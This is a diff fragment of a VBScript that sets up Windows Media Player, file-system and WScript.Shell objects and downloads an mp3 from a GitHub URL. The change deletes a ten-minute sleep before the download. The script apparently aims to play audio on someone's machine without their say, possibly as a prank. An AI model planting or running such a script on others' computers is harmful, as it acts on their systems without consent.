@@ -5,7 +5,6 @@ Set oPlayer = CreateObject("WMPlayer.OCX")
 Set obj = CreateObject("Scripting.FileSystemObject")
 Set Keys = CreateObject("WScript.Shell")
 strScript = Wscript.ScriptFullName
-WScript.Sleep 600000
 'dl s
 URL = "https://github.com/greisenmeisen/legendary-invention/raw/main/1.mp3"
 objWinHttp.open "GET", URL, False
